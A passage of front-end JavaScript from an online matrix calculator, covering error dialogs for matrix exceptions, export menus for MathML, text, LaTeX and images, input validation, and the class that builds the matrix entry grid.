        object[id] = y;
      }
    }
    var inputs = document.querySelectorAll("input");
    for (var k = 0; k < inputs.length; k += 1) {
      var name = inputs[k].name;
      if (name != undefined && (name.slice(0, 2) === "k-" || name === "expression")) {
        object[name] = inputs[k].value;
      }
    }
    var s = JSON.stringify(object);
    window.onerror(s, error.fileName || "", error.lineNumber || 0, error.columnNumber || 0, error);
  };

  globalThis.postError = postError;

    var handleError = function (initialInput, classList, e, positionInfo) {
      //TODO: check
      var message = e.message;
      var i = message.indexOf(":");
      var errorName = i === -1 ? message : message.slice(0, i);
      var errorDetail = i === -1 ? "" : message.slice(i + 1);

      if (errorName === "ArithmeticException") {
        Dialog.alert(getInputErrorHTML(positionInfo, i18n.divisionByZeroError));//?
      } else if (errorName === "IntegerInputError") {
        var integerInput = errorDetail;
        Dialog.alert(getInputErrorHTML({input: integerInput, startPosition: -1, endPosition: -1, p: undefined}, getInputError(null)));//?
      } else if (errorName === "NotSupportedError") {
        Dialog.alert(getInputErrorHTML(positionInfo, i18n.operationIsNotSupported));//?
        postError(e, positionInfo.input, initialInput, classList);
      } else if (errorName === "UserError") {
        Dialog.alert(getInputErrorHTML(positionInfo, getInputError(e)));//?
        postError(e, positionInfo.input, initialInput, classList);
      } else if (errorName === "SingularMatrixException") {
        Dialog.alert(i18n.determinantIsEqualToZeroTheMatrixIsSingularNotInvertible);
      } else if (errorName === "MatrixDimensionMismatchException") {
        Dialog.alert(i18n.matricesShouldHaveSameDimensions);
      } else if (errorName === "NonSquareMatrixException") {
        var text = errorDetail !== "" ? errorDetail : i18n.matrixIsNotSquare;
        Dialog.alert(text);
      } else if (errorName === "NonRealMatrixException") {
        Dialog.alert(i18n.matrixIsNotReal);
      } else if (errorName === "NonSymmetricMatrixException") {
        Dialog.alert("<math><mi>A</mi><mo>&ne;</mo><msup><mi>A</mi><mi>T</mi></msup></math>" + " — " + i18n.theMatrixIsNotSymmetric);
      } else if (errorName === "DimensionMismatchException") {
        Dialog.alert(i18n.theNumberOfColumnsInFirstMatrixShouldEqualTheNumberOfRowsInSecond);
      } else if (errorName === "ValueMissingError") {
        hit({error: message});//?
        var inputElementId = errorDetail;
        var inputElement = document.getElementById(inputElementId);
        reportValidity(inputElement, i18n.pleaseFillOutThisField);
      } else {
        Dialog.alert(getInputErrorHTML(positionInfo, getInputError(null)));//?
        postError(e, positionInfo.input, initialInput, classList);
        window.sendSnapshot();
        //throw new TypeError(message);
        console.log(e);
      }
    };

//!
var decimalFractionDigits = -1;

/* #matrix-menu-dialog */

var getMatrixMenuShow = function (matrixContainer) {
  return matrixContainer.parentNode.querySelector(".matrix-menu-show") || matrixContainer.parentNode.parentNode.querySelector(".matrix-menu-show");
};

var showDialog = function (matrixMenu, content) {
  var anchorPoint = {
    left: Number.parseFloat(matrixMenu.getAttribute("data-left")),
    top: Number.parseFloat(matrixMenu.getAttribute("data-top"))
  };
  //!
  // as MathML elements are not focusable, move the focus to the button (Firefox + contextmenu)
  var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
  if (document.activeElement === matrixContainer && document.activeElement.focus == null) {
    var focusNode = getMatrixMenuShow(matrixContainer);
    focusNode.focus();
  }
  //!
  var dialog = Dialog.standard(undefined, [[anchorPoint.left, anchorPoint.top], [0.5, 0.5]], content, "<button autofocus=\"autofocus\" type=\"submit\">" + i18n.close + "</button>");
  dialog.setAttribute("dir", "ltr");
  var input = dialog.querySelector("input") || dialog.querySelector("textarea") || dialog.querySelector("img");
  if (input.tagName.toLowerCase() !== 'img') {
    input.select();
  }
  input.focus();
};

var onShowMathMLOrTextOrLaTex = function (menuitem, type, singleline) {
  hit({click: "show-text-" + type});
  var matrixMenu = menuitem.parentNode;
  var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
  var presentations = getMatrixPresentationsFromMatrix(matrixContainer, matrixContainer.getAttribute("data-matrix"));
  var value = presentations[type];
  var content = singleline ? "<input type=\"text\" value=\"" + Utils.escapeHTML(value) + "\" />" : "<textarea class=\"show-textarea\" wrap=\"off\">" + Utils.escapeHTML(value) + "</textarea>";
  showDialog(matrixMenu, content);
};

var onShowMathML = function (event) {
  onShowMathMLOrTextOrLaTex(this, "application/mathml-presentation+xml", false);
};

var onShowText = function (event) {
  onShowMathMLOrTextOrLaTex(this, "text/ascii-math", true);
};

var onShowLaTeX = function (event) {
  onShowMathMLOrTextOrLaTex(this, "application/x-latex", false);
};

var onShowImage = function (event) {
  hit({click: "show-image-menuitem"});
  var matrixMenu = this.parentNode;

  var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
  var image = MathMLToSVG.drawMathMLElement(matrixContainer);
  var content = "<img width=\"" + image.width + "\" height=\"" + image.height + "\" src=\"" + image.src + "\" tabindex=\"0\" />";
  showDialog(matrixMenu, content);
};

var queryCommand = function (command, f) {
  if (document.queryCommandSupported != undefined && document.queryCommandEnabled != undefined) { // ... undefined in Opera Mini 35 - ?
    // `document.queryCommandEnabled("copy")` returns false in Edge 17 when the selection is "collapsed"
    // `document.queryCommandEnabled("copy")` returns false, but "copy" works in Opera 12 (if allow js clipboard access)
    // `document.queryCommandEnabled(command)` throws an error in IE 8 - 11 - ?, so it is needed to use `document.queryCommandSupported(command)` at first
    try {
      return document.queryCommandSupported(command) && f(document.queryCommandEnabled(command));
    } catch (error) {
      // `document.queryCommandEnabled("copy")` throws an error in Firefox < 41 for "copy", but `document.queryCommandSupported("copy")` incorrectly returns true
      // Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0 for "insertText"
      console.log(error);
    }
  }
  return false;
};

var isCommandSupported = function (command) {
  return queryCommand(command, function (x) {
    return true;
  });
};

var isCommandEnabled = function (command) {
  return queryCommand(command, function (x) {
    return x;
  });
};

var insertText = function (input, text, selectionStart, selectionEnd) {
  // "insertText" is enabled for Edge 17, but "undo" does not work correctly with it, so let's try to use ms-beginUndoUnit+ms-endUndoUnit
  if (isCommandEnabled("ms-beginUndoUnit")) {
    document.execCommand("ms-beginUndoUnit", false, true);
  }
  if (isCommandEnabled("insertText")) {
    document.execCommand("insertText", false, text);// "undo" support
  } else {
    var value = input.value;
    input.value = value.slice(0, selectionStart) + text + value.slice(selectionEnd);
  }
  if (isCommandEnabled("ms-endUndoUnit")) {
    document.execCommand("ms-endUndoUnit", false, true);
  }
};



var prepareMatrixMenu = function (dataForMatrix, clientX, clientY, rect) {
  var matrixMenu = document.getElementById("matrix-menu");
  if (matrixMenu == undefined) {
    matrixMenu = document.getElementById("matrix-menu-template").content.firstElementChild.cloneNode(true);
    var insertInMenuItemTemplate = matrixMenu.firstElementChild;
    insertInMenuItemTemplate.parentNode.removeChild(insertInMenuItemTemplate);
    var tables = document.querySelectorAll(".matrix-table");
    for (var i = 0; i < tables.length; i += 1) {
      var id = tables[i].getAttribute("data-id");
      var node = document.createElement("menuitem");
      node.id = "print-matrix-menuitem-" + id;
      node.setAttribute("label", insertInMenuItemTemplate.getAttribute("label").slice(0, -2) + " " + id);
      node.addEventListener("click", onPrintMatrix, false);
      matrixMenu.insertBefore(node, matrixMenu.firstElementChild);
    }
    document.body.appendChild(matrixMenu);
    if (!isCommandSupported("copy")) {
      var copyMenuItem = document.getElementById("copy-matrix-to-clipboard-menuitem");
      copyMenuItem.parentNode.removeChild(copyMenuItem);
    } else {
      document.getElementById("copy-matrix-to-clipboard-menuitem").addEventListener("click", onCopyMatrixToClipboard, false);
    }
    document.getElementById("show-mathml-menuitem").addEventListener("click", onShowMathML, false);
    document.getElementById("show-text-menuitem").addEventListener("click", onShowText, false);
    document.getElementById("show-image-menuitem").addEventListener("click", onShowImage, false);
    document.getElementById("show-latex-menuitem").addEventListener("click", onShowLaTeX, false);
    Utils.check(matrixMenu);
  }
  matrixMenu.setAttribute("data-for-matrix", dataForMatrix);//!
  matrixMenu.setAttribute("data-left", (clientX !== 0 ? clientX : (rect.left + rect.right) * 0.5).toString());
  matrixMenu.setAttribute("data-top", (clientY !== 0 ? clientY : (rect.top + rect.bottom) * 0.5).toString());
};

var initializeMenuDialog = function (menuDialog, items) {
    var focusedElements = 0;
    var closeDialog = function () {
      if (menuDialog.getAttribute("open") != undefined) {
        menuDialog.close();
      }
    };
    var onItemFocus = function (event) {
      focusedElements += 1;
    };
    var onItemBlur = function (event) {
      focusedElements -= 1;
      window.setTimeout(function () {
        if (focusedElements === 0) {
          closeDialog();
        }
      }, 10);
    };
    var onItemClick = function (event) {
      event.preventDefault();//selection
      var i = event.target.getAttribute("data-i");
      if (i != undefined) {
        items[i].click();
      }
      closeDialog();
    };
    // https://www.w3.org/TR/wai-aria-practices-1.1/examples/listbox/js/listbox.js
    var keysSoFar = '';
    var startNode = null;
    var keyClear = 0;
    var clearKeysSoFar = function () {
      keysSoFar = '';
      startNode = null;
      keyClear = 0;
    };
    menuDialog.addEventListener("keypress", function (event) {
      if (!event.ctrlKey && !event.altKey && !event.metaKey && !event.defaultPrevented) {
        var target = document.activeElement;
        if (target.parentNode === this) {
          var s = String.fromCharCode(event.charCode).toLocaleUpperCase();
          if (startNode == null) {
            startNode = target;
          }
          keysSoFar += s;
          window.clearTimeout(keyClear);
          keyClear = window.setTimeout(clearKeysSoFar, 300);
          var node = startNode;
          for (var x = node.nextElementSibling || this.firstElementChild; x !== startNode; x = x.nextElementSibling || this.firstElementChild) {
            var label = x.textContent;
            if (keysSoFar === label.slice(0, keysSoFar.length).toLocaleUpperCase() && node === startNode) {
              node = x;
            }
          }
          if (node !== startNode) {
            event.preventDefault();
            node.focus();
          }
        }
      }
    }, false);
    menuDialog.addEventListener("keydown", function (event) {
      if (!event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
        var keyCode = event.keyCode;
        var target = document.activeElement;
        if (target.parentNode === this) {
          var DOM_VK_LEFT = 37;
          var DOM_VK_UP = 38;
          var DOM_VK_RIGHT = 39;
          var DOM_VK_DOWN = 40;
          var DOM_VK_ESCAPE = 27;
          var DOM_VK_RETURN = 13;

          if (keyCode === DOM_VK_LEFT || keyCode === DOM_VK_UP) {
            var previous = target.previousElementSibling;
            if (previous == undefined) {
              previous = this.lastElementChild;
            }
            if (previous != undefined) {
              event.preventDefault();
              previous.focus();
            }
          }
          if (keyCode === DOM_VK_RIGHT || keyCode === DOM_VK_DOWN) {
            var next = target.nextElementSibling;
            if (next == undefined) {
              next = this.firstElementChild;
            }
            if (next != undefined) {
              event.preventDefault();
              next.focus();
            }
          }
          if (keyCode === DOM_VK_ESCAPE) {
            event.preventDefault();
            closeDialog();
          }
          if (keyCode === DOM_VK_RETURN) {
            event.preventDefault();
            target.click();
          }
        }
      }
    }, false);
    var elements = menuDialog.querySelectorAll(".menuitem");
    for (var k = 0; k < elements.length; k += 1) {
      elements[k].addEventListener("focus", onItemFocus, false);
      elements[k].addEventListener("blur", onItemBlur, false);
      if (items != null) {//?
        elements[k].addEventListener("click", onItemClick, false);
      }
    }
};

var getMatrixMenuDialog = function (matrixMenu) {
  var matrixMenuDialog = document.getElementById("matrix-menu-dialog");
  if (matrixMenuDialog == undefined) {//?
    matrixMenuDialog = Dialog.create();
    matrixMenuDialog.id = "matrix-menu-dialog";
    matrixMenuDialog.classList.toggle("menu-dialog", true);
    matrixMenuDialog.setAttribute("role", "menu");
    var items = matrixMenu.querySelectorAll("menuitem");
    var html = "";
    for (var i = 0; i < items.length; i += 1) {
      html += "<a role=\"menuitem\" class=\"menuitem\" tabindex=\"0\" data-i=\"" + i.toString() + "\">" + items[i].getAttribute("label") + "</a>";
    }
    matrixMenuDialog.innerHTML = html;
    initializeMenuDialog(matrixMenuDialog, items);
    document.body.appendChild(matrixMenuDialog);
  }
  return matrixMenuDialog;
};

var onCopyMatrixToClipboard = function (event) {
  hit({click: "copy-matrix-to-clipboard-menuitem"});
  var matrixMenu = this.parentNode;
  var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
  //var focusNode = matrixContainer;//TODO: fix - cannot focus MathML element
  var focusNode = getMatrixMenuShow(matrixContainer);
  focusNode.focus();
  window.getSelection().collapse(focusNode, 0);
  // The previous line moves the focus to the body in Edge 17
  if (document.activeElement !== focusNode) {
    focusNode.focus();
  }
  try {
    document.execCommand("copy");
  } catch (error) {
    handleError("", "", error, {});
  }
};

// button
Utils.on("click", ".matrix-menu-show", function (event) {
  hit({click: "matrix-menu-show"});
  prepareMatrixMenu(this.getAttribute("data-for-matrix"), event.clientX, event.clientY, this.getBoundingClientRect());
  var matrixMenu = document.getElementById("matrix-menu");
  var matrixMenuDialog = getMatrixMenuDialog(matrixMenu);
  matrixMenuDialog.show(this.getBoundingClientRect(), undefined);
  matrixMenuDialog.firstElementChild.focus();//?
});

// button
Utils.on("click", ".popup-button", function (event) {
  var menuDialog = document.getElementById(event.target.getAttribute("data-menu"));
  if (menuDialog.getAttribute("data-initialized") == null) {
    //TODO: fix
    if (menuDialog.initDialog != null) {
      menuDialog.initDialog();
    }
    menuDialog.show = Dialog.prototype.show;
    menuDialog.nativeClose = menuDialog.close;
    menuDialog.close = Dialog.prototype.close;

    initializeMenuDialog(menuDialog, null);
    menuDialog.setAttribute("data-initialized", "true");
  }
  var rect = this.getBoundingClientRect();
  menuDialog.show(undefined, [[rect.right, rect.bottom], [1.0, 0.0]]);
  menuDialog.firstElementChild.focus();//?
});

// << Tables >>

var MatrixTables = {};

// << MatrixTable >>


//-----------------!

var getInputError = function (error) {
  if (error != null) {
    var t = null;
    var x = ' ';
    var y = ' ';
    if (/^UserError\: unexpected end of input, '[\s\S]' expected$/.exec(error.message) != null) {
      t = i18n.unexpectedEndOfInputYExpected;
      y = error.message.slice(-11, -10);
    } else if (/^UserError\: unexpected '[\s\S]', '[\s\S]' expected$/.exec(error.message) != null) {
      t = i18n.unexpectedXYExpected;
      x = error.message.slice(-14, -13);
      y = error.message.slice(-11, -10);
    } else if (/^UserError\: unexpected '[\s\S]'$/.exec(error.message) != null) {
      t = i18n.unexpectedX;
      x = error.message.slice(-2, -1);
    } else if (/^UserError\: unexpected end of input$/.exec(error.message) != null) {
      t = i18n.unexpectedEndOfInput;
    } else {
      console.error(error.message);
    }
    if (t != null && t !== "") {
      return t.replace(/\$\{x\}/g, "<code>" + x + "</code>").replace(/\$\{y\}/g, "<code>" + y + "</code>");
    }
  }
  return i18n.inputError.replace(/\$\{listOfExamples\}/g, i18n.listOfExamples).replace(/\$\{listOfComplexExamples\}/g, i18n.listOfComplexExamples) + i18n.colonSpacing + ":";
};

globalThis.getInputError = getInputError;//TODO: remove

  var setInputCustomValidity = function (input, checkedValue, error) {
    if (input.value === checkedValue) {
      var dataTitle = input.getAttribute("data-title");
      if (dataTitle == undefined) {
        var title = input.getAttribute("title");
        if (title == undefined) {
          title = "";
        }
        input.setAttribute("data-title", title);
        dataTitle = title;
      }
      if (error == null) {
        if (dataTitle !== "") {
          input.setAttribute("title", dataTitle);
        } else {
          input.removeAttribute("title");
        }
      } else {
        input.setAttribute("title", getInputError(error).replace(/<[^>]*>/g, "").replace(/\s*\:/g, ""));
      }
      var e = input.parentNode.classList.contains("a-input") ? input.parentNode : input;
      var isValid = error == null;
      //e.classList.toggle("invalid", !isValid);
      e.setAttribute("aria-invalid", !isValid ? "true" : "false");
      input.setAttribute("aria-invalid", !isValid ? "true" : "false");
    }
  };

  var getInputValue = function (value, type) {
    var v = value.trim();
    // Users are often trying to input "-"/"+" instead of "-1"/"+1" for SLU
    if ((v === "-" || v === "+") && (type === "system" || type === "polynomial")) {
      return v + "1";
    }
    if (v === "") {
      return "0";
    }
    return value;
  };


var checkInput = function (input, type) {
  var inputName = input.name;
  requestIdleCallback(inputName, function () {
    var checkedValue = input.value;
    var value = getInputValue(checkedValue, type); // getInputValue
    RPNProxy.checkExpression(value, function () {
      removeDataErrorAttribute(input);
      setInputCustomValidity(input, checkedValue, null);
    }, function (error) {
      updateDataErrorAttribute(input, error, RPNProxy.getPositionInfo());
      //TODO: other errors
      setInputCustomValidity(input, checkedValue, error);
    });
  }, 50);
};

// type: "simple" | "system" | "polynomial"
var checkTextarea = function (textarea, type) {
  requestIdleCallback(textarea.name, function () {
    var textareaValue = textarea.value;
    RPNProxy.checkExpressions(textareaValue, type, function () {
      removeDataErrorAttribute(textarea);
      setInputCustomValidity(textarea, textareaValue, null);
    }, function (error) {
      updateDataErrorAttribute(textarea, error, RPNProxy.getPositionInfo(), true);//?
      //TODO:
      console.log(error);
      setInputCustomValidity(textarea, textareaValue, error);
    });
  }, 200);
};

Utils.initialize(".a-input", function (element) {
  window.setTimeout(function () { // window.getComputedStyle(...)
    initializeAInput(element);
  }, 0);
  var input = element.querySelector(".fraction-input");
  element.setAttribute("dir", "ltr"); // "math-dir"
  if (input != undefined) {
    input.addEventListener("input", function (event) {
      var input = event.target;
      checkInput(input, "");
    }, false);
    checkInput(input, ""); // autofill
  }
});

Utils.initialize(".a-highlight", initializeAHighlight);
Utils.initialize(".a-tooltip", initializeATooltip);

var keyStorage = {
  a: function (methodName, key, value) {
    var result = undefined;
    try {
      var storage = window.localStorage;
      if (storage == undefined) {
        console.log("No localStorage");
        hit({localStorage: "No localStorage"});
      } else {
        if (methodName === "getItem") {
          result = storage.getItem(key);
        } else if (methodName === "setItem") {
          storage.setItem(key, value);
          if (storage.getItem(key) !== value) {
            console.log("No error");
            hit({localStorage: "No error"});
          }
        } else {
          throw new TypeError(methodName);
        }
      }
    } catch (error) {
      console.log(error);
      hit({localStorage: error.name});
    }
    return result;
  },
  getItem: function (key) {
    return keyStorage.a("getItem", key, undefined);
  },
  setItem: function (key, value) {
    if (keyStorage.a("setItem", key, value) != undefined) {
      throw new TypeError();
    }
  }
};

var timeoutIds = {};
var delayByKey = {};
var requestIdleCallback = function (key, callback, delay) {
  var timeoutId = timeoutIds[key];
  if (timeoutId == undefined || timeoutId === 0) {
    timeoutId = window.setTimeout(function () {
      timeoutIds[key] = 0;
      var start = Date.now();
      callback();
      var end = Date.now();
      if (end - start > 300) {
        hit({checkInput: roundValue(end - start, 1000 - 1)});
      }
      delayByKey[key] = Math.max(delay, end - start);
    }, delayByKey[key] || delay);
    timeoutIds[key] = timeoutId;
  }
};

// type : "simple", "system", "polynomial"
function MatrixTable(name, initialRows, initialCols, type, container) {
  this.name = name;
  this.rows = 0;
  this.cols = 0;
  this.initRows = initialRows;
  this.initCols = initialCols;
  this.mode = "cells";
  this.type = type;
  this.container = container;
  this.onmodechange = undefined;
  this.table = [];
  //this.updateTimeoutId = 0;

  var textareaName = this.name + "-textarea";
  //class=\"matrix\"
  
  var template = document.getElementById("insert-table-template");
  var templateContent = template.content;
  var matrixTableInner = templateContent.firstElementChild.cloneNode(true);
  var st2 = templateContent.firstElementChild.nextElementSibling.cloneNode(true);
  container.appendChild(matrixTableInner);
  container.appendChild(st2);

  matrixTableInner.innerHTML = '<div class="table-container"></div><div class="textarea-container"></div>';
  var tableTemplate = '<math><mrow><mo>(</mo><mpadded height="+4px" voffset="+2px"><mtable rowspacing="0ex" columnspacing="0em"></mtable></mpadded><mo>)</mo></mrow></math>';
  var textareaTemplate= '<math><mrow><mo>(</mo><mpadded height="+4px" voffset="+2px"><mi><span class="a-input"><textarea id="TEXTAREA_NAME" name="TEXTAREA_NAME" wrap="off" autocapitalize="off" autocomplete="off" spellcheck="false" class="matrix-table-textarea unfocused-placeholder" placeholder="-2  2 -3&#x0A;-1  1  3&#x0A; 2  0 -1"></textarea></span></mi></mpadded><mo>)</mo></mrow></math>';
  this.container.querySelector('.table-container').innerHTML = tableTemplate;
  this.container.querySelector('.textarea-container').innerHTML = textareaTemplate;

  this.tbody = container.querySelector("mtable");

  matrixTableInner.setAttribute("data-for", this.name);
  matrixTableInner.classList.toggle("matrix-table-inner", true);
  if (this.type === 'polynomial') {
    var mrow1 = matrixTableInner.querySelector('.table-container').querySelector('mrow');
    mrow1.removeChild(mrow1.firstElementChild);
    mrow1.removeChild(mrow1.lastElementChild);
    var mrow2 = matrixTableInner.querySelector('.textarea-container').querySelector('mrow');
    mrow2.removeChild(mrow2.firstElementChild);
    mrow2.removeChild(mrow2.lastElementChild);
  }
  if (this.type === 'system') {
    var mrow1 = matrixTableInner.querySelector('.table-container').querySelector('mrow');
    mrow1.firstElementChild.textContent = '{';
    mrow1.removeChild(mrow1.lastElementChild);
    var mrow2 = matrixTableInner.querySelector('.textarea-container').querySelector('mrow');
    mrow2.firstElementChild.textContent = '{';
    mrow2.removeChild(mrow2.lastElementChild);
  }

  var that = this;
  matrixTableInner.setAttribute("dir", "ltr"); // "math-dir"
  var clearTableButton = container.querySelector(".clear-table-button");
  clearTableButton.setAttribute("data-for", this.name);
  clearTableButton.addEventListener("click", function (event) {
    hit({click: "clear-table-button"});
    that.insert([], "", that.initRows, that.initCols);
  }, false);
  var onResizeTable = function (event) {
    hit({click: "resize-table-button"});
    var inc = this.getAttribute("data-inc");
    var n = Number.parseInt(inc, 10);
    that.insert(that.getRawInput("cells"), that.getRawInput(""), that.rows + (that.type !== "polynomial" ? n : 0), that.cols + n);
  };
  //var resizeButtons = container.querySelectorAll(".resize-table-button");
  var incrementSizeButton = container.querySelector(".increment-size-button");
  incrementSizeButton.setAttribute("data-for", this.name);
  incrementSizeButton.addEventListener("click", onResizeTable, false);
  this.incrementSizeButton = incrementSizeButton;
  var decrementSizeButton = container.querySelector(".decrement-size-button");
  decrementSizeButton.setAttribute("data-for", this.name);
  decrementSizeButton.addEventListener("click", onResizeTable, false);
  this.decrementSizeButton = decrementSizeButton;

  var swapModeButton = container.querySelector(".swap-mode-button");
  var onSwapModeChange = function (event) {
    hit({swapMode: (window.matchMedia != undefined ? window.matchMedia("(any-pointer: fine)").matches.toString() : "?")});
    event.preventDefault();
    var isChecked = this.getAttribute("aria-pressed") === "true";
    var isCellsMode = !isChecked;
    this.setAttribute("aria-pressed", isCellsMode ? "true" : "false");
    if ((isCellsMode && that.mode !== "cells") || (!isCellsMode && that.mode === "cells")) {
      that.onswapmode();
    }
  };
  swapModeButton.addEventListener("click", onSwapModeChange, false);

  this.swapModeButton = swapModeButton;

  this.textarea = container.querySelector("textarea");
  this.textarea.id = textareaName;
  this.textarea.name = textareaName;
  var onTextareaInput = function (event) {
    checkTextarea(that.textarea, that.type);
    that.update(event);
  };
  this.textarea.addEventListener("input", onTextareaInput, false);

  container.classList.toggle("matrix-table", true);
  container.setAttribute("data-matrix-table", this.name);

  Utils.check(container);

  this.variableNames = undefined;

  this._onKeyDown = function (event) {
    that.onKeyDown(event);
  };
  this._onInput = function (event) {
    var input = event.target;
    checkInput(input, that.type);
    that.update(event);
  };
  this._updateVariableNames = function (event) {
    that.updateVariableNames(event);
  };
}

MatrixTable.prototype.getState = function () {
  return {
    type: this.type,
    mode: this.mode,
    inputValues: this.getRawInput("cells"),
    variableNames: this.variableNames,
    textareaValue: this.getRawInput(""),
    rows: this.rows,
    cols: this.cols,
    textareaStyleWidth: this.textarea != undefined ? this.textarea.style.width : undefined,
    textareaStyleHeight: this.textarea != undefined ? this.textarea.style.height : undefined,
    firstInputElementId: this.getFirstInputElementId()
  };
};

MatrixTable.prototype.getDataState = function () {
  var state = {
    type: this.type,
    mode: this.mode,
    inputValues: this.getRawInput("cells"),
    variableNames: this.variableNames,
    textareaValue: this.getRawInput(""),
    firstInputElementId: this.getFirstInputElementId()
  };
  var type = this.type;
  var inputValues = state.inputValues;
  for (var i = 0; i < inputValues.length; i += 1) {
    for (var j = 0; j < inputValues[i].length; j += 1) {
      inputValues[i][j] = getInputValue(inputValues[i][j], type);
    }
  }
  return state;
};


// private
MatrixTable.prototype.updateInputWidths = function () {
  var dimensions = this.getDimensions(true);
  var expectedRows = dimensions.rows;
  var expectedCols = dimensions.cols;

  var table = this.table;
  var maxLengths = [];
  var i = -1;
  var j = -1;
  while (++i < table.length) {
    j = -1;
    while (++j < table[i].length) {
      var l = table[i][j].value.length;
      if (j < maxLengths.length) {
        maxLengths[j] = maxLengths[j] < l ? l : maxLengths[j];
      } else {
        maxLengths.push(l);
      }
    }
  }
  i = -1;
  while (++i < table.length) {
    j = -1;
    while (++j < table[i].length) {
      var w = 2 + maxLengths[j];
      var minWidth = this.type === "system" ? 5 : (6 + 1/3);
      if (w < minWidth) {
        w = minWidth;
      }
      if (w > 17) {
        w = 17;
      }
      var input = table[i][j];
      input.style.minWidth = (minWidth * 0.6) + "em";
      input.style.maxWidth = (w * 0.6) + "em";

      //!
      if ((i < expectedRows && j < expectedCols) || (i < expectedRows && this.type === "system" && j === table[i].length - 1)) {
        if (input.getAttribute("placeholder") !== "0") {
          input.setAttribute("placeholder", "0");
        }
      } else {
        if (input.getAttribute("placeholder") != undefined) {
          input.removeAttribute("placeholder");
        }
      }
      var far = (i > expectedRows || j > expectedCols) && (i > expectedRows || this.type !== "system" || j !== table[i].length - 1);
      input.classList.toggle("far", far);
      var cellChild = input.parentNode.parentNode.parentNode.parentNode; // <mi></mi>
      var previousElementSibling = cellChild.previousElementSibling;
      if (previousElementSibling != undefined) {
        previousElementSibling.classList.toggle("far", far);
      }
      var nextElementSibling = cellChild.nextElementSibling;
      while (nextElementSibling != null) {
        nextElementSibling.classList.toggle("far", far);
        nextElementSibling = nextElementSibling.nextElementSibling;
      }
    }
  }
};

//private
MatrixTable.prototype.updateTextareaHeight = function () {
  var value = this.textarea.value;
  var i = 0;
  var c = 0;
  while (i >= 0) {
    c += 1;
    i = value.indexOf('\n', i + 1);
  }
  var placeholderLines = 3;
  var h = Math.floor(Math.max(placeholderLines + 1, c + 2) * 4 / 3);
  this.textarea.style.minHeight = Math.min(h, 12).toString() + "em";
};

// private
MatrixTable.prototype.update = function (event) {
  var that = this;
  //if (this.updateTimeoutId === 0) {
    //this.updateTimeoutId = window.setTimeout(function () {
      //that.updateTimeoutId = 0;
      if (that.mode === "cells") {
        that.updateInputWidths();
      } else {
        that.updateTextareaHeight();
      }
    //}, 0);//9ms -?
  //}
};

  //TODO: move somewhere
MatrixTable.prototype.updateVariableNames = function (event) {
  var variableName = event.target.getAttribute('data-value');
  var j = Number.parseInt(event.target.getAttribute('data-index'));
  this.variableNames[j] = variableName;
  //TODO: - ?
  //var t2 = this.getState();
  //this.insert(t2.inputValues, t2.textareaValue, t2.rows, t2.cols, t2.textareaStyleWidth, t2.textareaStyleHeight, t2.mode, t2.variableNames);
  //TODO: remove
  var c = makeContent(variableName);
  var table = this.tbody;
  //! should work on <mtable></mtable> (no HTMLTableSectionElement#rows)
  for (var row = table.firstElementChild.nextElementSibling; row != null; row = row.nextElementSibling) {
    var cell = row.firstElementChild;
    for (var i = 0; i < j; i += 1) {
      cell = cell.nextElementSibling;
    }
    cell.lastElementChild.innerHTML = c;
  }
};

// `inputValues` - array of array of strings (non-square)
MatrixTable.prototype.insert = function (inputValues, textareaValue, rows, cols, textareaStyleWidth, textareaStyleHeight, mode, variableNames) {
  if (inputValues == undefined) {
    inputValues = [];
  }
  if (textareaValue == undefined) {
    textareaValue = toMultilineString(inputValues);
  }
  if (rows == undefined) {
    rows = inputValues.length;
  }
  if (cols == undefined) {
    cols = 0;
    for (var y = 0; y < inputValues.length; y += 1) {
      cols = Math.max(cols, inputValues[y].length);
    }
  }
  if (mode == undefined) {
    mode = this.mode;
  }
  if (rows === 0) {
    rows = this.initRows;
    cols = this.initCols;
  }
  rows = Math.max(rows, 1);
  cols = Math.max(cols, 1);
  if (this.type === "polynomial") {
    rows = 1;
    cols = Math.max(cols, 2); // swapmode
  }
  if (this.type === "system") {
    cols = Math.max(cols, 2);
  }
  variableNames = variableNames || undefined;

  this.rows = rows;
  this.cols = cols;

  this.table = new Array(this.rows);
  for (var i = 0; i < this.rows; i += 1) {
    this.table[i] = new Array(this.cols);
    for (var j = 0; j < this.cols; j += 1) {
      this.table[i][j] = undefined;
    }
  }

  //! autocomplete:
  //! "off" does not allow to use the bfcache, but helps with an input from mobiles
  // <table> ?
  //var inputTitle = "element " + (i + 1).toString() + ", " + (j + 1).toString();
  var inputTemplate = document.createElement("div");

  // no way to input negative numbers on some android devices with inputmode="numeric" or inputmode="decimal"
  // https://bugs.webkit.org/show_bug.cgi?id=197916 - numeric becomes useless in iOS 13
  var userAgent = window.navigator.userAgent;
  var inputMode = /android/i.test(userAgent) || !/OS\s+12/.test(userAgent) ? '' : ' inputmode="numeric"';

  //! to fix an issue in Firefox with an extra height
  inputTemplate.innerHTML = '<span class="matrix-table-cell">' +
                            '<span>' +
                            '<span class="a-input">' +
                            '<input id="id" name="name" type="text" autocapitalize="off" autocomplete="off" spellcheck="false"' + inputMode + ' class="matrix-table-input unfocused-placeholder" data-for="for" data-row="-1" data-column="-1" />' +
                            '</span>' +
                            '</span>' +
                            '</span>';
  var name = this.name;
  var that = this;
  function makeNewInput(i, j) {
    var aInput = inputTemplate.firstElementChild.cloneNode(true);
    var inputName = name + "-" + i + "-" + j;
    var input = aInput.querySelector("input");
    input.id = inputName;
    input.name = inputName;
    input.setAttribute("data-for", name);
    input.setAttribute("data-row", i);
    input.setAttribute("data-column", j);
    input.addEventListener("keydown", that._onKeyDown, false);
    input.addEventListener("input", that._onInput, false);
    return aInput;
  }

  this.variableNames = variableNames;
  if (this.type === 'system') {
    this.variableNames = new Array(this.cols);
    for (var j = 0; j < this.cols; j += 1) {
      this.variableNames[j] = variableNames != null && j < variableNames.length ? variableNames[j] : 'x_' + (j + 1);
    }
  }

  // Update the table:
  // We are trying to avoid removal of old inputs to support undo/redo and to not loose the focus on "paste":
  var tbody = this.tbody;
  var MathML = tbody.namespaceURI;
  var row = tbody.firstElementChild;
  for (var i = 0; i < this.rows; i += 1) {
    if (row == null) {
      row = document.createElementNS(MathML, "mtr");
      tbody.appendChild(row);
    }
